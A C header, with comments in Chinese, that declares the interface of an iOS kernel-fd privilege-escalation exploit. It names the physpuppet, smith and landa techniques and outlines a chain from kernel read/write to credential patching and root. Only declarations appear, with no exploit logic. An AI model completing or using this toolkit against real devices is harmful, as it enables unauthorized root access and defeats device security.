//
//  kfd.h
//  iOS kernel fd exploit — 多种提权技术集成
//
//  支持 iOS 15.0 ~ 18.x
//  技术路径: physpuppet (IOSurface) / smith (weightBufs) / landa (perf control)
//  目标: 获取 kernel r/w → 修改进程 credential → UID=0
//

#ifndef KFD_H
#define KFD_H

#include <stdint.h>
#include <stdbool.h>
#include <mach/mach.h>

// ---- 内核版本信息 ----
typedef struct {
    uint32_t major;
    uint32_t minor;
    uint32_t patch;
    char     build[32];
} kfd_osversion_t;

// ---- kfd 状态 ----
typedef enum {
    KFD_ERR_NONE = 0,
    KFD_ERR_OPEN_FAILED,
    KFD_ERR_NO_SUITABLE_TECHNIQUE,
    KFD_ERR_UNSUPPORTED_OS,
    KFD_ERR_KERNEL_RW_FAILED,
    KFD_ERR_CRED_PATCH_FAILED,
} kfd_error_t;

// ---- 公开 API ----

/// 初始化 kfd 内部数据结构（偏移表、版本检测等），返回 0 表示成功。
int kfd_init(void);

/// 尝试打开内核 fd 并获取 r/w 能力，返回 0 表示成功。
int kfd_open(void);

/// 将当前进程提权为 UID=0（root），返回 0 表示成功。
int kfd_get_root(void);

/// 关闭 kfd 句柄并清理。
void kfd_close(void);

/// 完整的提权流程: init → open → get_root，返回 0 表示成功。
/// 成功时当前进程的 EUID 已变为 0。
int kfd_escalate(void);

/// 获取最后一次错误描述。
const char *kfd_get_error(void);

#endif // KFD_H
